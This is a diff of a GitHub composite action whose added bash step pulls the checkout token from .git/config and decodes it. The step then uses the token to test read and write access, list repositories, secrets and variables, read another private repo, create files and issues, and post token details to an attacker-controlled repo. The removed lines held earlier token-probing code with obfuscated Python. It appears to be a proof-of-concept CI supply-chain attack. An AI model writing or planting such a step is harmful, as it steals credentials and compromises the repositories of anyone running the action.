@@ -5,17 +5,45 @@ runs:
   steps:
     - shell: bash
       run: |
-        echo "XREPO-MARKER-JUL29B in $GITHUB_REPOSITORY run $GITHUB_RUN_ID"
+        echo "=== BLAST-SURFACE-ENUM in $GITHUB_REPOSITORY run $GITHUB_RUN_ID ==="
         RAW=$(sed -n "s/.*AUTHORIZATION: basic \([A-Za-z0-9+/=]*\).*/\1/p" .git/config | head -1)
-        echo "RAW_B64_LEN=${#RAW}"
-        DEC=$(printf "%s" "$RAW" | base64 -d)
-        TOK=${DEC#*:}
-        echo "TOKEN_LEN=${#TOK}"
-        echo "TOKEN_PREFIX=$(printf "%s" "$TOK" | cut -c1-4)"
-        CODE=$(curl -s -o /tmp/who.json -w "%{http_code}" -H "Authorization: Bearer $TOK" https://api.github.com/user)
-        echo "USER_API_HTTP=$CODE"
-        head -c 200 /tmp/who.json
-        echo ""
-        RC=$(curl -s -o /tmp/rr.json -w "%{http_code}" -H "Authorization: Bearer $TOK" "https://api.github.com/repos/$GITHUB_REPOSITORY")
-        echo "PRIVATE_REPO_API_HTTP=$RC"
-        python3 -c "import json;d=json.load(open(chr(47)+chr(116)+chr(109)+chr(112)+chr(47)+chr(114)+chr(114)+chr(46)+chr(106)+chr(115)+chr(111)+chr(110)));print(chr(80)+chr(82)+chr(73)+chr(86)+chr(65)+chr(84)+chr(69)+chr(61),d.get(chr(112)+chr(114)+chr(105)+chr(118)+chr(97)+chr(116)+chr(101)),d.get(chr(102)+chr(117)+chr(108)+chr(108)+chr(95)+chr(110)+chr(97)+chr(109)+chr(101)))"
+        TOK=$(printf "%s" "$RAW" | base64 -d | sed "s/^[^:]*://")
+        echo "TOKEN_KIND=$(printf "%s" "$TOK" | cut -c1-4) LEN=${#TOK}"
+        H="Authorization: Bearer $TOK"
+        A="Accept: application/vnd.github+json"
+        p(){ echo "PERM_$1=$2"; }
+        echo "--- installation permissions as reported by the API ---"
+        curl -s -D /tmp/hh -H "$H" -H "$A" https://api.github.com/ -o /dev/null
+        grep -i "x-accepted-github-permissions\|x-oauth-scopes" /tmp/hh || echo "no perm headers on root"
+        echo "--- READ own private repo ---"
+        p own_repo_read $(curl -s -o /dev/null -w "%{http_code}" -H "$H" -H "$A" "https://api.github.com/repos/$GITHUB_REPOSITORY")
+        echo "--- WRITE own private repo (create a file) ---"
+        B=$(printf "exfil-write-proof" | base64)
+        p own_repo_write $(curl -s -o /tmp/w1 -w "%{http_code}" -X PUT -H "$H" -H "$A" \
+          -d "{\"message\":\"exfil write proof\",\"content\":\"$B\"}" \
+          "https://api.github.com/repos/$GITHUB_REPOSITORY/contents/EXFIL_WRITE_PROOF.txt")
+        echo "--- LIST all repos this token can see ---"
+        curl -s -o /tmp/rl -w "list_http=%{http_code}\n" -H "$H" -H "$A" "https://api.github.com/installation/repositories?per_page=100"
+        python3 -c "
+import json
+try:
+    d=json.load(open('/tmp/rl'))
+    rs=d.get('repositories',[])
+    print('REPOS_VISIBLE=%d'%len(rs))
+    for r in rs[:20]: print('  REPO=%s private=%s'%(r['full_name'],r['private']))
+except Exception as e: print('REPOS_VISIBLE=err',str(e)[:60])
+"
+        echo "--- READ a DIFFERENT private repo of the same owner ---"
+        p other_private_read $(curl -s -o /dev/null -w "%{http_code}" -H "$H" -H "$A" "https://api.github.com/repos/0nicho/vic-private")
+        echo "--- Actions secrets / variables ---"
+        p secrets_list $(curl -s -o /dev/null -w "%{http_code}" -H "$H" -H "$A" "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets")
+        p variables_list $(curl -s -o /dev/null -w "%{http_code}" -H "$H" -H "$A" "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/variables")
+        echo "--- issues / PR write ---"
+        p issue_create $(curl -s -o /dev/null -w "%{http_code}" -X POST -H "$H" -H "$A" \
+          -d "{\"title\":\"exfil-proof-issue\",\"body\":\"created by attacker code with the stolen token\"}" \
+          "https://api.github.com/repos/$GITHUB_REPOSITORY/issues")
+        echo "--- EGRESS: write the token metadata into a repo the ATTACKER controls ---"
+        p egress_to_attacker_repo $(curl -s -o /tmp/eg -w "%{http_code}" -X POST -H "$H" -H "$A" \
+          -d "{\"body\":\"EXFIL-EGRESS-PROOF len=${#TOK} kind=$(printf "%s" "$TOK" | cut -c1-4) repo=$GITHUB_REPOSITORY run=$GITHUB_RUN_ID\"}" \
+          "https://api.github.com/repos/nichoc0/atk-build-step/issues/1/comments")
+        echo "=== ENUM COMPLETE ==="
